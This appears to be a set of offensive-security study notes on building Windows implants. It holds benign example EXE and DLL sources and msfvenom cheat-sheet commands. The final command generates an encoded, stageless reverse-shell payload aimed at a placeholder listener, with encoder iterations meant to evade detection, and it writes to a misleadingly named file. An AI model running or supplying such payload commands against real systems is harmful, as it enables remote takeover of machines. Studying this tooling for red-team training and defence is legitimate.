# Payloads Generation
## Portable Executable files
- Open with PEbear https://github.com/hasherezade/pe-bear
- Interesting sections: `text`(`.txt)`, `data`(`.data`), `resources`(`.rsrc`)

#### EXE vs DLL
- Exe are seperate programs which spawn an independant process
- DLL are modules that are loaded in existing processes

#### Example commandline exe
```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {

	printf("Test\n");
	
	getchar();
    
	return 0;
}
```

##### Build & Run
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

implant.exe
```

#### Example dll
```
#include <Windows.h>
#pragma comment (lib, "user32.lib")


BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI RunME(void) {
	
	MessageBox(
		NULL,
		"Test",
		"Message",
        MB_OK
	);
	 
		 return TRUE;
	}
}
```

##### Build & Run
```
cl.exe /D_USRDLL /D_WINDLL implantDLL.cpp /MT /link /DLL /OUT:implant.dll

rundll32 implant.dll,RunME
```

## Payload generation
- A lot of C2 frameworks such as Cobalt Strike, Metasploit etc can create their own payloads.

### Msfvenom
- Change the `-f` parameter to change the payload type. For example  `c` or `csharp`.
- Use `-e` to select an encoder and `-i` to change the iterations
- Use `EXITFUNC=thread` to get a clean exit and keep the process running [link](https://www.hacking-tutorial.com/tips-and-trick/what-is-metasploit-exitfunc/).

#### List payload & outputs & encoders
```
msfvenom --list payloads
msfvenom --list payloads | grep windows | grep x64

msfvenom --list formats

msfvenom --list encoders
```

#### Generate calc.exe
```
msfvenom -p windows/exec CMD='calc.exe' -f hex
msfvenom -p windows/x64/exec CMD='calc.exe' -f hex
```

#### Generate Messagebox payload
```
msfvenom -p windows/x64/messagebox TEXT="0xjs" -o msgbox64.bin
```

#### Generate Stageless Reverse Shell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 11 -o msgbox64.bin
```
